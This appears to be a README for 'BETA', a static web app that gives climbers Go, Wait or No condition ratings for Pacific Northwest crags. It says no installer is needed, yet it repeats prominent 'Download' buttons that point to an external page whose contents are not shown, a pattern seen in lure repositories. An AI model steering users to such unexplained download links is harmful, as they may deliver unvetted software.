# BETA v2026 - climbing conditions intelligence 2026

> **BETA is a browser-based climbing conditions intelligence tool for rock climbers in the Pacific Northwest, translating live weather and crag data into straightforward Go, Wait, or No guidance.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owenqkjdavis2141/beta-weather-go-wait-no?style=flat-square)](https://github.com/owenqkjdavis2141/beta-weather-go-wait-no)

---

<p align="center">
  <a href="https://owenqkjdavis2141.github.io/beta-weather-go-wait-no/">
    <img src="https://img.shields.io/badge/Download-BETA%20Latest-brightgreen?style=for-the-badge" alt="Download BETA">
  </a>
</p>

> **[Direct Download - BETA v2026](https://owenqkjdavis2141.github.io/beta-weather-go-wait-no/)**

---

[Download Latest Build](https://owenqkjdavis2141.github.io/beta-weather-go-wait-no/)

---

## What BETA Does

BETA gives climbers a quicker way to judge whether a day is likely to work by combining weather inputs with crag-specific condition rules. Rather than making you decode raw forecasts yourself, it reduces the data to a compact status that is simpler to review before you head out.

It is aimed at climbers planning trips in the Pacific Northwest, where weather and conditions can vary sharply between zones and elevations. The site is delivered as a static web app and kept current automatically, so the latest scoring remains available without a manual publishing workflow.

---

## Key Capabilities

- Pulls in real-time weather data for climbing areas
- Converts conditions into clear Go, Wait, or No guidance
- Uses crag-specific thresholds in a Python scoring pipeline
- Designed around Pacific Northwest climbing regions and crags
- Supports rock climbing route planning and same-day trip checks
- Refreshes automatically through GitHub Actions every 6 hours
- Deployed as a static site on GitHub Pages
- Lightweight web interface that opens easily in any browser

---

## Installation

BETA is distributed as a web project, so normal use does not require a local installer.

To review or self-host it:

1. Clone the repository:
   `git clone https://github.com/owenqkjdavis2141/beta-weather-go-wait-no.git
2. Open the project files locally or deploy the static output to your own web host.
3. If you are working with the scoring pipeline, make sure the Python environment required by the repository is available before running any update or build scripts.

Launch note: open the published site in a browser or serve the static files from your chosen hosting environment.

---

## Usage

Treat BETA as a quick reference before a climb when you are deciding whether conditions look worth the drive.

Typical workflow:
1. Open the site.
2. Select the climbing area or crag you want to check.
3. Review the current condition score.
4. Compare the status with your own plans and route objectives.
5. Recheck before departure if weather is changing.

If you maintain the project, the scoring output is produced by the Python-based conditions pipeline and then published to the static site on its regular update schedule.

---

## Configuration

Most of the behavior is controlled by the scoring data and update pipeline, not by end-user settings.

If you are modifying the project, look for:
- crag threshold definitions in the Python scoring logic
- data refresh steps in the GitHub Actions workflow
- static site content and layout in the web files

Example configuration shape:

{
  "region": "Pacific Northwest",
  "mode": "Go / Wait / No",
  "update_interval_hours": 6
}

---

## Requirements

- Web browser for viewing the published site
- Internet access for current weather and climbing-area data
- GitHub account if you plan to fork, host, or automate updates
- Python environment for working with the scoring pipeline
- GitHub Actions support for automated refreshes
- Static hosting compatible with GitHub Pages-style deployment

---

## FAQ

**How frequently does the data refresh?**  
The repository is configured to update every 6 hours through GitHub Actions.

**Do I need to install anything to use it?**  
No. The main experience is a web-based static site.

**What powers the condition ratings?**  
They are derived from weather data and crag-specific thresholds in the Python scoring pipeline.

**What if the site appears stale?**  
Check the most recent published build, then inspect the workflow and data refresh pipeline if you are maintaining the repository.

**Can I adjust thresholds or regions?**  
Yes, if you are editing the project files. Thresholds and region-specific logic are handled in the project configuration and scoring code.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
